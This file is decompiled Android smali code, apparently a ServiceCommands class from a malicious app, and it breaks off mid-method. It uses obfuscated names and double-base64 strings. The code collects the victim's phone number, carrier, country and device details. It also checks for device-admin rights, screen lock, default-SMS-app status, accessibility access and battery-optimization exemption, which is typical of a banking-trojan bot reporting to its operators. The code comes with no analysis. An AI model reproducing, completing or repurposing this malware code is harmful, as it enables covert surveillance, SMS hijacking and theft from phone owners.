.class public Lnaqsl/ebxcb/exu/ServiceCommands;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field break:Landroid/telephony/TelephonyManager;

.field byte:Ljava/lang/String;

.field case:Ljava/lang/String;

.field catch:I

.field char:Ljava/lang/String;

.field class:I

.field const:I

.field else:Ljava/lang/String;

.field fddo:Lnaqsl/ebxcb/exu/ifdf;

.field final:I

.field for:Lnaqsl/ebxcb/exu/int;

.field goto:Ljava/lang/String;

.field ifdf:Lnaqsl/ebxcb/exu/int;

.field int:Lnaqsl/ebxcb/exu/for;

.field long:Ljava/lang/String;

.field new:Landroid/content/Context;

.field this:Ljava/lang/String;

.field try:Ljava/lang/String;

.field void:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .registers 4

    const-string v0, ""

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v1, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v1}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    iput-object v1, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    new-instance v1, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v1}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v1, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v1, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v1}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v1, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->for:Lnaqsl/ebxcb/exu/int;

    new-instance v1, Lnaqsl/ebxcb/exu/for;

    invoke-direct {v1}, Lnaqsl/ebxcb/exu/for;-><init>()V

    iput-object v1, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->int:Lnaqsl/ebxcb/exu/for;

    const-string v1, "VFVFOVBRPT0="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->byte:Ljava/lang/String;

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->case:Ljava/lang/String;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->char:Ljava/lang/String;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->else:Ljava/lang/String;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->goto:Ljava/lang/String;

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->long:Ljava/lang/String;

    const-string v0, "UlZKU1QxST0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->this:Ljava/lang/String;

    const/4 v0, 0x0

    iput v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->catch:I

    iput v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->class:I

    iput v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->const:I

    iput v0, p0, Lnaqsl/ebxcb/exu/ServiceCommands;->final:I

    return-void
.end method


# virtual methods
.method public fddo()V
    .registers 26

    move-object/from16 v0, p0

    const-string v1, "TVE9PQ=="

    const-string v2, ""

    const-string v3, "T2c9PQ=="

    :try_start_8
    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-virtual {v4, v5, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_20

    new-instance v4, Landroid/content/Intent;

    const-class v5, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-direct {v4, v0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_1e} :catch_1f

    goto :goto_20

    :catch_1f
    nop

    :cond_20
    :goto_20
    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v4, v5}, Lnaqsl/ebxcb/exu/int;->catch(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_2b

    return-void

    :cond_2b
    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "YVhOU1pXTnZibTVsWTNSbFpBPT0="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v0, v5}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "dHJ1ZQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    const-string v6, "TkE9PQ=="

    const-string v7, "Wm1Gc2MyVT0="

    const-string v8, "Y0QwPQ=="

    if-eqz v4, :cond_b1

    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v9, "YVhOU1pXTnZibTVsWTNSbFpBPT0="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v4, v0, v9, v10}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v14, v15}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "ZkMwdFBpQlNaV052Ym01bFkzUmxaQ0IwYnlCT1pYUjNiM0pyTG53PQ=="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v9, v10, v11}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_b1
    const-string v4, "phone"

    invoke-virtual {v0, v4}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/telephony/TelephonyManager;

    iput-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->break:Landroid/telephony/TelephonyManager;

    iget-object v4, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v4, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    sget-object v9, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v11, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "SUNnPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v11, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "S1E9PQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->break:Landroid/telephony/TelephonyManager;

    invoke-virtual {v11}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v11

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v13, "android.permission.READ_PHONE_STATE"

    invoke-virtual {v12, v13}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v12

    if-nez v12, :cond_138

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "S0E9PQ=="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->break:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "S1E9PQ=="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->break:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->goto:Ljava/lang/String;

    goto :goto_150

    :cond_138
    const-string v12, "S0U1UEtRPT0="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->goto:Ljava/lang/String;

    const-string v12, "U1c1a1pXWnBibVZr"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->long:Ljava/lang/String;

    :goto_150
    :try_start_150
    const-string v12, "device_policy"

    invoke-virtual {v0, v12}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/app/admin/DevicePolicyManager;

    new-instance v13, Landroid/content/ComponentName;

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-class v15, Lnaqsl/ebxcb/exu/fddo/fddo/fddo;

    invoke-direct {v13, v14, v15}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v12, v13}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v12

    if-eqz v12, :cond_171

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->byte:Ljava/lang/String;

    :cond_171
    const-string v12, "keyguard"

    invoke-virtual {v0, v12}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/app/KeyguardManager;

    invoke-virtual {v12}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v12

    if-nez v12, :cond_189

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->case:Ljava/lang/String;
    :try_end_189
    .catch Ljava/lang/Exception; {:try_start_150 .. :try_end_189} :catch_189

    :catch_189
    :cond_189
    const/4 v12, 0x0

    :try_start_18a
    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v15, "VTJWMGRHbHVaM05CYkd3PQ=="

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v13, v14, v15}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    iput-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    if-eq v13, v2, :cond_1b7

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    const-string v14, "Zmc9PQ=="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v13

    aget-object v13, v13, v12

    iput-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    goto :goto_1bc

    :cond_1b7
    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;
    :try_end_1b9
    .catch Ljava/lang/Exception; {:try_start_18a .. :try_end_1b9} :catch_1ba

    goto :goto_1bc

    :catch_1ba
    iput-object v2, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->try:Ljava/lang/String;

    :goto_1bc
    const/4 v13, 0x1

    :try_start_1bd
    sget v14, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v15, 0x18

    if-lt v14, v15, :cond_1dc

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v14, v15}, Lnaqsl/ebxcb/exu/int;->long(Landroid/content/Context;)Z

    move-result v14

    if-eqz v14, :cond_1d0

    iput v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->catch:I

    goto :goto_1d2

    :cond_1d0
    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->catch:I

    :goto_1d2
    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v14, v15}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v14

    if-eqz v14, :cond_1de

    :cond_1dc
    iput v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->catch:I

    :cond_1de
    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v14, v15}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v14

    if-eqz v14, :cond_200

    iput v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->const:I

    iget-object v14, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v16, "YVhOQlkyTmxjM05pYVd4cGRIaz0="

    invoke-static/range {v16 .. v16}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    invoke-static/range {v16 .. v16}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v14, v15, v13, v12}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_21b

    :cond_200
    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->const:I

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v14, "YVhOQlkyTmxjM05pYVd4cGRIaz0="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v12, v13, v14, v15}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_21b
    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v12, v13}, Lnaqsl/ebxcb/exu/int;->byte(Landroid/content/Context;)Z

    move-result v12

    if-eqz v12, :cond_229

    const/4 v12, 0x1

    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->class:I

    goto :goto_22c

    :cond_229
    const/4 v12, 0x0

    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->class:I

    :goto_22c
    sget v12, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v13, 0x13

    if-lt v12, v13, :cond_246

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_244

    const/4 v12, 0x1

    :catch_241
    :goto_241
    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->final:I
    :try_end_243
    .catch Ljava/lang/Exception; {:try_start_1bd .. :try_end_243} :catch_269

    goto :goto_269

    :catch_244
    :cond_244
    const/4 v12, 0x0

    goto :goto_241

    :cond_246
    :try_start_246
    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    const-string v14, "WkdWc1gzTjNjdz09"

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_266

    const/4 v12, 0x1

    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->final:I
    :try_end_265
    .catch Ljava/lang/Exception; {:try_start_246 .. :try_end_265} :catch_244

    goto :goto_269

    :cond_266
    const/4 v12, 0x0

    :try_start_267
    iput v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->final:I
    :try_end_269
    .catch Ljava/lang/Exception; {:try_start_267 .. :try_end_269} :catch_241

    :catch_269
    :goto_269
    :try_start_269
    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v13, "ZEdsdFpWOTNiM0py"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v0, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    iput-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->this:Ljava/lang/String;
    :try_end_27b
    .catch Ljava/lang/Exception; {:try_start_269 .. :try_end_27b} :catch_27b

    :catch_27b
    :try_start_27b
    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v14, "Y0d4aGVWOXdjbTkwWldOMA=="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v0, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "ZEhKMVpRPT0="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v14

    if-eqz v14, :cond_29d

    const/4 v13, 0x1

    goto :goto_2ae

    :cond_29d
    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13
    :try_end_2a9
    .catch Ljava/lang/Exception; {:try_start_27b .. :try_end_2a9} :catch_2ad

    if-eqz v13, :cond_2ad

    const/4 v13, 0x0

    goto :goto_2ae

    :catch_2ad
    :cond_2ad
    const/4 v13, 0x2

    :goto_2ae
    :try_start_2ae
    sget v14, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v15, 0x17

    if-lt v14, v15, :cond_2c5

    const-string v14, "power"

    invoke-virtual {v0, v14}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Landroid/os/PowerManager;

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v14
    :try_end_2c4
    .catch Ljava/lang/Exception; {:try_start_2ae .. :try_end_2c4} :catch_2c5

    goto :goto_2c6

    :catch_2c5
    :cond_2c5
    const/4 v14, 0x0

    :goto_2c6
    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v17, "YzNSbGNBPT0="

